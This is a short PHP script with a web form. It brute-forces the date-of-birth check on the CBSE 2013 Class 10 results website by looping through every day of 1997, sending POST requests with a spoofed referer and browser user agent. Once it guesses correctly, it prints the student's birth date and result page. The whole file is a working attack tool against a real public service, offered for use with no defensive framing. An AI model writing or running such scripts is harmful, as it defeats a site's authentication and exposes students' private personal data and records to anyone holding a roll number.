<?php
if(isset($_GET['roll'])) {
	$rollno = $_GET['roll'];
	$url = "cbseresults.nic.in/class10/cbse102013cvb.asp";
	$referer = "http://cbseresults.nic.in/class10/cbse102013cvb.htm";
	$useragent = "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0";
	

	$error = "Result Not Found";
	$dateofbirth = false;
	$temp = 0;

	for ($month = 1; $month <= 12; ++$month) {  
		for ($day = 1; $day <= 30; ++$day) {
			$handle = curl_init();
			if ($month==2 && $day>26) continue;
			curl_setopt($handle, CURLOPT_URL, $url);     
			curl_setopt($handle, CURLOPT_POST, true);
			if ( $day < 10 && $month < 10) {
				curl_setopt($handle, CURLOPT_POSTFIELDS, "regno=".$rollno."&dob=0".$day."/0".$month."/"."1997&B1=Submit"); 
				} else if($day >= 10 && $month >= 10) {
				curl_setopt($handle, CURLOPT_POSTFIELDS, "regno=".$rollno."&dob=".$day."/".$month."/"."1997&B1=Submit"); 
			} else if($day <10) {
				curl_setopt($handle, CURLOPT_POSTFIELDS, "regno=".$rollno."&dob=0".$day."/".$month."/"."1997&B1=Submit"); 
			} else {
				curl_setopt($handle, CURLOPT_POSTFIELDS, "regno=".$rollno."&dob=".$day."/0".$month."/"."1997&B1=Submit"); 
			}
			curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($handle, CURLOPT_REFERER, $referer);
			curl_setopt($handle, CURLOPT_USERAGENT, $useragent); 

			$result = curl_exec($handle);
			if(!strpos($result, $error)) {
				$answer = $result;
				$dateofbirth = $day."/".$month."/"."1997";
				$temp = 1;
				break;
			}
			if($temp == 1)
			break;
			curl_close($handle);
		}
		if($temp == 1)
			break;
	}
	if(!$dateofbirth) {
		echo "<b> No result found!!</b>";
	} else {
		echo "Date of birth is: ";
		echo $dateofbirth."<br>".$answer;
	}
}
?>
<html>
<body>
<form method="get">
Roll No: <input type="text" name="roll">
<input type="submit" value="Submit">
</form>
Please wait! It takes 5 minutes to find the result. DO NO PRESS REFRESH!
</body>